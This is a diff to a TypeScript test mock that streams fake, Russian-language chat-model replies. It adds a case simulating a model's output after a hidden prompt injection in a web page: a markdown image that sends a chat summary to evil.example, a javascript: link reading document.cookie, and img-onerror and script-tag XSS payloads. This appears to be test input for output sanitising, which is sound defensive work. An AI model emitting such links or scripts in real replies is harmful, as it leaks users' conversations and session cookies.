@@ -18,7 +18,17 @@ const fakeFetch: typeof fetch = async (_url, init) => {
   if (prompt.includes('[429]')) {
     return new Response(JSON.stringify({ error: { code: 429, metadata: { retry_after_seconds: 12 } } }), { status: 429 })
   }
-  const words = prompt.includes('[long]')
+  // What a model says after reading a page with a hidden instruction in it.
+  const INJECTED = [
+    'Готово. ',
+    '![статус](https://evil.example/leak?chat=summary-of-your-chat) ',
+    '[подробнее](javascript:alert(document.cookie)) ',
+    '<img src="https://evil.example/pixel" onerror="alert(1)"> ',
+    '<script>alert(2)</script>',
+  ]
+  const words = prompt.includes('[inject]')
+    ? INJECTED
+    : prompt.includes('[long]')
     ? Array.from({ length: 400 }, (_, i) => `слово${i} `)
     : ['Привет', '! ', 'Это ', '**тестовый** ', 'ответ.']
   const stream = new ReadableStream<Uint8Array>({
